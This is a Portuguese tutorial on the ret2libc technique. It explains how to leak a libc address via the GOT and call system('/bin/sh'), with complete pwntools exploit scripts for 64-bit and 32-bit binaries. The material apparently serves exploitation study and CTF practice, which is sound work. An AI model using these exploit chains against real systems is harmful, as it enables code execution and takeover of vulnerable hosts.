ret2libc

ret2libc é ROP usando funções da libc em vez de funções do programa. A libc inteira está mapeada no processo, então system, execve, mprotect e a string /bin/sh estão disponíveis mesmo que o binário nunca as use. O objetivo mais comum é system("/bin/sh"), também chamado de ret2system.

O problema é saber onde a libc está. Com ASLR, a base muda a cada execução, e o ataque vira dois estágios: vazar um endereço da libc e, na mesma execução, usar os endereços calculados.

Endereço = base + offset​

O offset de cada símbolo dentro da libc é fixo para uma dada versão. Só a base varia.

libc = ELF('./libc.so.6')                    # a MESMA libc que o alvo usa
libc.address = base                          # a partir daqui, libc.sym já devolve endereços absolutos
system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh\0'))     # a libc contém essa string

Pelo terminal: readelf -s libc.so.6 | grep " system" e strings -t x libc.so.6 | grep /bin/sh.

Se o desafio não fornece a libc, identifique-a pelos 12 bits baixos de dois ou três símbolos vazados em libc.rip ou no libc-database. Para rodar o binário localmente com a libc certa, veja pwninit.

Sem ASLR (estudo local), a base é constante: aparece em ldd ./vuln, em vmmap no GDB e em /proc/<pid>/maps.

Estágio 1: leak​

A GOT guarda o endereço real das funções já chamadas. Chamando puts(puts@got), o próprio puts imprime o endereço dele na libc. Em seguida voltamos para a main para repetir o overflow.

from pwn import *

elf = context.binary = ELF('./vuln')
libc = ELF('./libc.so.6')
p = process()

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

payload  = b'A' * offset
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])
p.sendlineafter(b'> ', payload)

leak = u64(p.recvline().strip().ljust(8, b'\0'))    # puts imprime 6 bytes e para no \0
libc.address = leak - libc.sym['puts']
log.info(f'libc base: {hex(libc.address)}')         # tem que terminar em 000

Cuidados:

  • Antes do leak pode haver outras saídas do programa. Consuma-as com recvuntil até o ponto certo.
  • A função usada no leak precisa já ter sido chamada (GOT resolvida), ou o binário ter Full RELRO. puts@got depois de o programa imprimir algo é sempre seguro.
  • Se um byte do endereço for 0x0a, o recvline corta o leak. Rode de novo.
  • Sem puts: printf(got) também serve, e write(1, got, 8) precisa de rsi e rdx.

Estágio 2: system("/bin/sh")​

payload  = b'A' * offset
payload += p64(ret)                                  # alinhamento da stack
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\0')))
payload += p64(libc.sym['system'])
p.sendlineafter(b'> ', payload)
p.interactive()

O ret extra resolve o desalinhamento da stack: sem ele, o system costuma morrer em um movaps. Como o segundo overflow acontece em outra passada pela main, o alinhamento pode ser diferente do primeiro: se com o ret falhar, teste sem.

Depois do leak, os gadgets da libc também ficam disponíveis (ROP(libc)), o que resolve a falta de pop rdx ou até de pop rdi no binário. Se system falhar por algum motivo (ambiente sem /bin/sh, seccomp), as alternativas são execve via syscall, um one_gadget ou uma chain open/read/write.

32 bits​

Os argumentos vão na stack, sem gadgets. Ao entrar em uma função por ret, ela espera encontrar [endereço de retorno][arg1][arg2]... no topo:

# Estágio 1
payload = b'A' * offset + p32(elf.plt['puts']) + p32(elf.sym['main']) + p32(elf.got['puts'])
leak = u32(p.recv(4))

# Estágio 2
payload = b'A' * offset + p32(libc.sym['system']) + p32(libc.sym['exit']) + p32(next(libc.search(b'/bin/sh\0')))

O exit como endereço de retorno é opcional: serve para o processo terminar limpo quando a shell fechar. Em 32 bits não há o problema de alinhamento.

Para os detalhes de onde cada argumento fica, veja Convenção de chamada.
